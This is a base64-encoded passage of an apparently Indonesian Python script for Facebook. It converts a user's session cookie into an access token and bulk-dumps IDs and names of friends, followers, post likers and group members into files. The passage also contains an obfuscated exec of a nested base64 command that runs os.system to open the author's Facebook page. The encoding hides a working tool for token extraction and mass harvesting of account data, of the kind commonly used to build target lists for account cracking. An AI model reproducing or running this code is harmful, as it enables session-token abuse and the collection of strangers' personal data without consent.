jksZW4tVVM7cT0wLjgsZW47cT0wLjcnLCAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLCAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLCAndXNlci1hZ2VudCc6IHVhLCAnSG9zdCc6ICgnJykuam9pbihiczQucmUuZmluZGFsbCgnOi8vKC4qPykkJywgaG9zdHMpKSwgJ3JlZmVyZXInOiBob3N0cyArICcvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04JywgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJ30NCiAgICByZXR1cm4gcg0KZGVmIGN2cyhjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD1bXQ0KCWZvciBfaV8gaW4gZW51bWVyYXRlKGNvb2tpZXMua2V5cygpKToNCgkJaWYgX2lfWzBdPT1sZW4oY29va2llcy5rZXlzKCkpLTE6cmVzdWx0LmFwcGVuZChfaV9bMV0rIj0iK2Nvb2tpZXNbX2lfWzFdXSkNCgkJZWxzZTpyZXN1bHQuYXBwZW5kKF9pX1sxXSsiPSIrY29va2llc1tfaV9bMV1dKyI7ICIpDQoJcmV0dXJuICIiLmpvaW4ocmVzdWx0KQ0KZGVmIGN2ZChjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD17fQ0KCXRyeToNCgkJZm9yIF9pXyBpbiBjb29raWVzLnNwbGl0KCI7Iik6DQoJCQlyZXN1bHQudXBkYXRlKHtfaV8uc3BsaXQoIj0iKVswXTpfaV8uc3BsaXQoIj0iKVsxXX0pDQoJCXJldHVybiByZXN1bHQNCglleGNlcHQ6DQoJCWZvciBfaV8gaW4gY29va2llcy5zcGxpdCgiOyAiKToNCgkJCXJlc3VsdC51cGRhdGUoe19pXy5zcGxpdCgiPSIpWzBdOl9pXy5zcGxpdCgiPSIpWzFdfSkNCgkJcmV0dXJuIHJlc3VsdA0KIyBDT05WRVJUIENPT0tJRSBLRSBUT0tFTiBCWSBST01JIEFGUklaQUwNCmRlZiBrb252ZXJ0ZXIoKToNCglfY29va2llID0gb3BlbignZGF0YS9jb29raWVzJywgJ3InKS5yZWFkKCkNCglfaGVhZGVyID0gew0KCQknSG9zdCc6J2J1c2luZXNzLmZhY2Vib29rLmNvbScsDQoJCSdjYWNoZS1jb250cm9sJzonbWF4LWFnZT0wJywNCgkJJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOicxJywNCgkJJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IFJlZG1pIDRBIEJ1aWxkL01NQjI5TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU5LjAuMzA3MS45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQoJCSdhY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KCQknY29udGVudC10eXBlJyA6ICd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnLA0KCQknYWNjZXB0LWVuY29kaW5nJzonZ3ppcCwgZGVmbGF0ZScsDQoJCSdhY2NlcHQtbGFuZ3VhZ2UnOidpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsDQoJCSdjb29raWUnOiBfY29va2llDQoJfQ0KCXRyeToNCgkJbGluZyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiwgaGVhZGVycz1faGVhZGVyKQ0KCQljYXJpID0gcmUuc2VhcmNoKCcoRUFBR1x3KyknLCBsaW5nLnRleHQpDQoJCXJvbXogPSBjYXJpLmdyb3VwKDEpDQoJCWlmICdFQUFHJyBpbiByb216Og0KCQkJcHJpbnQgKCdcbiVzJXMgTG9naW4gc3VjY2VzLCBtb2hvbiB0dW5nZ3UgJyUoSCx0aWwpKQ0KCQkJb3BlbignZGF0YS90b2tlbi50eHQnLCAndycpLndyaXRlKHJvbXopO2xvZ2luX3h4KCkNCgkJCWV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYjNNdWMzbHpkR1Z0S0NkNFpHY3RiM0JsYmlCb2RIUndjem92TDNkM2R5NW1ZV05sWW05dmF5NWpiMjB2Y205dGFTNWhabkpwZW1Gc0xqRXdNaWNwTzIxbGJuVW9LUT09JykpDQoJCQlleGl0KCkNCglleGNlcHQgQXR0cmlidXRlRXJyb3I6DQoJCXByaW50KCIlc+KAoiB0ZXJqYWRpIGtlc2FsYWhhbiBzYWF0IGNvbnZlcnQsIHBlcmlrc2EgY29va2llIGFuZGEgIiUoTSkpO2V4aXQoKQ0KIyBEVU1QIFBVQkxJSw0KZGVmIHB1Ymxpayhyb216LGhlYWRlcnM9aGVhZGVyKToNCiAgICB0cnk6DQogICAgICAgIG9zLm1rZGlyKCdkdW1wJykNCiAgICBleGNlcHQ6cGFzcw0KICAgIHRyeToNCiAgICAJcHJpbnQgKCJcbiVzJXMgJXNLZXRpayAnJXNtZSVzJyBqaWthIGluZ2luIGR1bXAgZGFmdGFyIHRlbWFuIHNlbmRpcmkgIiUoVSx0aWwsTyxILE8pKQ0KICAgICAgICBpZHQgPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgZ2FzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIG5tID0ganNvbi5sb2FkcyhnYXMudGV4dCkNCiAgICAgICAgZmlsZSA9ICgnZHVtcC8nK25tWydmaXJzdF9uYW1lJ10rJy5qc29uJykucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgYmZmID0gb3BlbihmaWxlLCAndycpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1mcmllbmRzLmxpbWl0KDUwMDEpJmFjY2Vzc190b2tlbj0lcyclKGlkdCxyb216KSkNCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmb3IgX3hfIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOg0KICAgICAgICAgICAgaWQuYXBwZW5kKF94X1snaWQnXSArICc8PT4nICsgX3hfWyduYW1lJ10pDQogICAgICAgICAgICBiZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQogICAgICAgICAgICBwcmludCAnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSwNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCg0KICAgICAgICBiZmYuY2xvc2UoKQ0KICAgICAgICBwcmludCAoJ1xuXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIGRhcmkgJXMnJShILHRpbCxubVsnbmFtZSddKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBNQVNTQUwgDQpkZWYgbWFzc2FsKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KCXRyeToNCgkJb3MubWtkaXIoJ2R1bXAnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Og0KCQlqdW0gPSBpbnQocmF3X2lucHV0KCdcbiVzJXMlcyBKdW1sYWggaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKSkNCglleGNlcHQ6anVtPTENCglzaW1wYW4gPSByYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGRhZnRhciB0ZW1hbiBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCglmaWxlID0gKCdkdW1wLycrc2ltcGFuKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQoJYmZmID0gb3BlbihmaWxlLCAndycpDQoJZm9yIHQgaW4gcmFuZ2UoanVtKToNCgkJdCArPTENCgkJaWR0ID0gcmF3X2lucHV0KCclcyVzICVzVGFyZ2V0IGlkICVzJXMgPiAlcyclKFUsdGlsLE8sdCxNLEspKQ0KCQl0cnk6DQoJCQlmb3IgX3hfIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMiJShpZHQsIHJvbXopKS5qc29uKClbImRhdGEiXToNCgkJCQlpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCgkJCQliZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQojICAgICAgICAgICAgICBwcmludCAoJ1xyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCVzID4gJXMlcyclKFUsdGlsLE8sTSxILHN0cihsZW4oaWQpKSkpDQojICAgICAgICAgICAgICAsc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlleGl0KCdcbiVzJXMgaWQgdGlkYWsgcHVibGljJyUoTSx0aWwpKQ0KCXRyeToNCgkJYmZmLmNsb3NlKCkNCgkJcHJpbnQgKCclcyVzJXMgVG90YWwgaWQlcyA+ICVzJXMnJShVLHRpbCxPLE0sSCxsZW4oaWQpKSkNCgkJcHJpbnQgKCdcbiVzJXMgU3VjY2VzIGR1bXAgaWQgbWFzc2FsICclKEgsdGlsKSkNCgkJcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCgkJcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCgkJbWVudSgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW1idWF0IGZpbGUnJShNLHRpbCkpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW55aW1wYW4gZmlsZSclKE0sdGlsKSkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJZXhpdCgnXG4lcyVzIHN0b3AnJShNLHRpbCkpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcbiVzJXMgdGlkYWsgYWRhIGtvbmVrc2knJShNLHRpbCkpDQojIERVTVAgRk9MTE9XRVJTDQpkZWYgZm9sbG93ZXJzKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBmb2xsb3dlcnMgc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzICA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBiYXRhcyA9IHJhd19pbnB1dCgnJXMlcyAlc01heGltYWwgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIGdhcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUoaWR0LHJvbXopKQ0KICAgICAgICBubSA9IGpzb24ubG9hZHMoZ2FzLnRleHQpDQogICAgICAgIGZpbGUgPSAoJ2R1bXAvJytubVsnZmlyc3RfbmFtZSddKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQogICAgICAgIGJmZiA9IG9wZW4oZmlsZSwgJ3cnKQ0KICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9zdWJzY3JpYmVycz9saW1pdD0lcyZhY2Nlc3NfdG9rZW49JXMnJShpZHQsYmF0YXMscm9teikpDQogICAgICAgIHogPSBqc29uLmxvYWRzKHIudGV4dCkNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICgnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSksDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgwLjAwNTApDQoNCiAgICAgICAgYmZmLmNsb3NlKCkNCiAgICAgICAgcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBmb2xsb3dlcnMgZGFyaSAlcyAnJShILHRpbCxubVsibmFtZSJdKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBQT1NUSU5HQU4gDQpkZWYgcG9zdGluZ2FuKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc1Blcmx1IGRpIGluZ2F0IHBvc3RpbmdhbiBoYXJ1cyBiZXJzaWZhdCBwdWJsaWsgIiUoVSx0aWwsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc0lkIHBvc3QlcyAgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHNpbXBhbiA9IHJhd19pbnB1dCgnJXMlcyVzIE5hbWEgZmlsZSVzID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2xpa2VzP2xpbWl0PTk5OTk5OSZhY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIGlkID0gW10NCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmaWxlID0gKCdkdW1wLycgKyBzaW1wYW4gKyAnLmpzb24nKS5yZXBsYWNlKCcgJywgJ18nKQ0KICAgICAgICBiZmYgPSBvcGVuKGZpbGUsICd3JykNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICdcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQlcyA+JXMgJXMgJyAlIChVLHRpbCxPLE0sSCxzdHIobGVuKGlkKSkpLA0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KDQogICAgICAgIGJmZi5jbG9zZSgpDQogICAgICAgIHByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcG9zdGluZ2FuICclKEgsdGlsKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBHUk9VUA0KY2xhc3MgZ3JvdXA6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYsIGNvb2tpZXMpOg0KCQlzZWxmLmdsaXN0PVtdDQoJCXNlbGYuY29va2llcz1jb29raWVzDQoJCXNlbGYubWFudWFsKCk7ZXhpdCgpDQoJZGVmIG1hbnVhbChzZWxmKToNCgkJcHJpbnQoIlxuJXMlcyVzIFBlcmx1IGRpIGluZ2F0IGdyb3VwIGhhcnVzIGJlcnNpZmF0IHB1YmxpayBhdGF1IHdhamliIGpvaW4gZ3JvdXAiJShVLHRpbCxPKSkNCgkJaWQ9cmF3X2lucHV0KCIlcyVzJXMgSWQgZ3JvdXBzJXMgPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgaWQgaW4oIiIpOg0KCQkJc2VsZi5tYW51YWwoKQ0KCQllbHNlOg0KCQkJX3JfPWJzNC5CZWF1dGlmdWxTb3VwKHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPXNlbGYuY29va2llcykudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQkJaWYgImtvbnRlbiB0aWRhayIgaW4gX3JfLmZpbmQoInRpdGxlIikudGV4dC5sb3dlcigpOg0KCQkJCWV4aXQoIiVzJXMgaW5wdXQgaWQgZ3J1cCB5ZyB2YWxpZCBnb2Jsb2ssIGlkIGVycm9yLCBhdGF1IGx1IGJlbG9tIGpvb2luIGRpIGdydXAiJShNLHRpbCkpDQoJCQllbHNlOg0KCQkJCXNlbGYubGlzdGVkPXsiaWQiOmlkLCJuYW1lIjpfcl8uZmluZCgidGl0bGUiKS50ZXh0fQ0KCQkJCXNlbGYuZnVja195b3UoKQ0KCQkJCXByaW50KCIlcyVzJXMgTmFtYSBncnVwJXMgPiAlcyVzLi4iJShVLHRpbCxPLE0sSCxzZWxmLmxpc3RlZC5nZXQoIm5hbWUiKVswOjIwXSkpDQoJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkKQ0KCWRlZiBmdWNrX3lvdShzZWxmKToNCgkJc2VsZi5mbD1yYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUgJXM+ICVzJyUoVSx0aWwsTyxNLEspKS5yZXBsYWNlKCIgIiwiXyIpDQoJCWlmIHNlbGYuZmw9PScnOnNlbGYuZnVja195b3UoKQ0KCQlvcGVuKHNlbGYuZmwsInciKS5jbG9zZSgpDQoJZGVmIGR1bXBzKHNlbGYsIHVybCk6DQoJCV9yXz1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9c2VsZi5jb29raWVzLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQlwcmludCgiXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkICVzPiAlcyVzIFx4MWJbMTs5N20tIG1vaG9uIHR1bmdndVxyIiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNlbGYuZmwpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpDQoJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCgkJZm9yIF9pXyBpbiBfcl8uZmluZF9hbGwoImgzIik6DQoJCQl0cnk6DQoJCQkJaWYgbGVuKGJzNC5yZS5maW5kYWxsKCJcLyIsX2lfLmZpbmQoImEiLGhyZWY9VHJ1ZSkuZ2V0KCJocmVmIikpKT09MToNCgkJCQkJb2dlaD1faV8uZmluZCgiYSIsaHJlZj1UcnVlKQ0KCQkJCQlpZiAicHJvZmlsZS5waHAiIGluIG9nZWguZ2V0KCJocmVmIik6DQoJCQkJCQlfYV89IiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLG9nZWguZ2V0KCJocmVmIikpKQ0KCQkJCQkJaWYgbGVuKF9hXyk9PTA6Y29udGludWUNCgkJCQkJCWVsaWYgX2FfIGluIG9wZW4oc2VsZi5mbCkucmVhZCgpOg0KCQkJCQkJCWNvbnRpbnVlDQoJCQkJCQllbHNlOg0KCQkJCQkJCW9wZW4oc2VsZi5mbCwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUoX2FfLG9nZWgudGV4dCkpDQoJCQkJCQkJY29udGludWUNCgkJCQkJZWxzZToNCgkJCQkJCV9hXz0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCIvKC4qPylcPyIsb2dlaC5nZXQoImhyZWYiKSkpDQoJCQkJCQlpZiBsZW4oX2FfKT09MDpjb250aW51ZQ0KCQkJCQkJZWxpZiBfYV8gaW4gb3BlbihzZWxmLmZsKS5yZWFkKCk6DQoJCQkJCQkJY29udGludWUNCgkJCQkJCWVsc2U6DQoJCQkJCQkJb3BlbihzZWxmLmZsLCJhKyIpLndyaXRlKCIlczw9PiVzXG4iJShfYV8sb2dlaC50ZXh0KSkNCgkJCWV4Y2VwdDpjb250aW51ZQ0KCQlmb3IgX2lfIGluIF9yXy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCgkJCWlmICJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIgaW4gX2lfLnRleHQ6DQoJCQkJd2hpbGUgVHJ1ZToNCgkJCQkJdHJ5Og0KCQkJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIrX2lfLmdldCgiaHJlZiIpKQ0KCQkJCQkJYnJlYWsNCgkJCQkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQkJCQkJcHJpbnQoIlxyXHgxYlsxOzkxbeKAoiVzLCByZXRyeWluZy4uLiIlZSk7Y29udGludWUNCgkJcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBpZCBtZW1iZXIgZ3JvdXAgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNlbGYuZmwpKTtyYXdfaW5wdXQoJ1xuJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKTttZW51KCkNCmRlZiBjZWsoYXJnKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIFRydWUNCgkJZWxzZTpyZXR1cm4gRmFsc2UNCgllbHNlOnJldHVybiBGYWxzZQ0KIyBEVU1QIFBFTkNBUklBTiBOQU1BDQpkZWYgZHVtcGZsKCk6DQogICAgY3ZkcyA9IE5vbmUNCiAgICBjb29raWUgPSBOb25lDQogICAgbmV3ID0gTm9uZQ0KICAgIGlmIGNlaygxKSA9PSBGYWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY29va2llID0gcmF3X2lucHV0KCJcbiVzJXMlcyBTdXBheWEgYmVrZXJqYSBtYXN1a2FuIGNvb2tpZSBmYWNlYm9vayBhbmRhXG4lcyMgJXNDb29raWUlcyA+ICVzIiUoVSx0aWwsTyxQLE8sTSxLKSkNCiAgICAgICAgICAgIGN2ZHMgPSBjdmQoY29va2llKQ0KICAgICAgICAgICAgbmV3ID0gVHJ1ZQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCgiXHgxYlsxOzkxbeKAoiBpbnZhbGlkIGNvb2tpZSIpO2R1bXBmbCgpDQogICAgZWxzZToNCiAgICAgICAgY3ZkcyA9IGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHAnLCBjb29raWVzPWN2ZHMsIGhlYWRlcnM9aGRjb2soKSkudGV4dA0KICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgnbG9nb3V0JywgcikpICE9IDA6DQogICAgICAgIGlmIGt1ZWgoY3ZkcykgIT0gVHJ1ZToNCiAgICAgICAgICAgIGV4aXQoIiVzJXMgZ2FnYWwgc2FhdCBtZW5kZXRla3NpIGJhaGFzYS4iJShNLHRpbCkpDQogICAgICAgICNwcmludCgiXG4lcyVzJXMgTG9naW4gc2ViYWdhaSVzIFsgJXMlcy4uXSIlKFUsdGlsLE8sTSxILGJzNC5CZWF1dGlmdWxTb3VwKHIsImh0bWwucGFyc2VyIikuZmluZCgidGl0bGUiKS50